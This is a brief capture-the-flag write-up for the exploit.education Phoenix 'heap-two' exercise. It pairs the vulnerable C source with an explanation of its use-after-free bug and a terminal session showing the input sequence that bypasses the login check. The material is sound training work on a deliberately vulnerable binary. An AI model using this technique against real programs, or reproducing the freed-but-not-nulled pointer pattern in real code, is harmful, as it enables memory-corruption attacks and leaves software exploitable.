# HEAP TWO


## SOURCE CODE
```c
#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv) {
  char line[128];

  printf("%s\n", BANNER);

  while (1) {
    printf("[ auth = %p, service = %p ]\n", auth, service);

    if (fgets(line, sizeof(line), stdin) == NULL) break;

    if (strncmp(line, "auth ", 5) == 0) {
      auth = malloc(sizeof(struct auth));
      memset(auth, 0, sizeof(struct auth));
      if (strlen(line + 5) < 31) {
        strcpy(auth->name, line + 5);
      }
    }
    if (strncmp(line, "reset", 5) == 0) {
      free(auth);
    }
    if (strncmp(line, "service", 6) == 0) {
      service = strdup(line + 7);
    }
    if (strncmp(line, "login", 5) == 0) {
      if (auth && auth->auth) {
        printf("you have logged in already!\n");
      } else {
        printf("please enter your password\n");
      }
    }
  }
}
```


## STRATEGY
The goal is to set *'auth'* to a value different from zero and get the login. In reset 
the *'auth'* memory is freed but the pointer is not set to NULL. That's a 'use after free' 
vulnerability. To exploit it we have to allocate auth struct first. Then reset it (the 
memory will be freed but the pointer will continue to point at the struct address). Now if 
we call service, the memory will be allocated starting from the same address of auth. If 
we enter a sufficiently long string (with values different from zero), the previous 
*'auth'* will be overwritten. Since the *'auth'* pointer is still available and pointing to 
service, the login will be passed.


## EXPLOIT
```shell
user@phoenix-amd64:/opt/phoenix/i486$ ./heap-two 
Welcome to phoenix/heap-two, brought to you by https://exploit.education
[ auth = 0, service = 0 ]
auth AAA
[ auth = 0x8049af0, service = 0 ]
reset
[ auth = 0x8049af0, service = 0 ]
service AAAAAAAAAAAAAAAAAAAAA
[ auth = 0x8049af0, service = 0x8049af0 ]
login
you have logged in already!
[ auth = 0x8049af0, service = 0x8049af0 ]

```
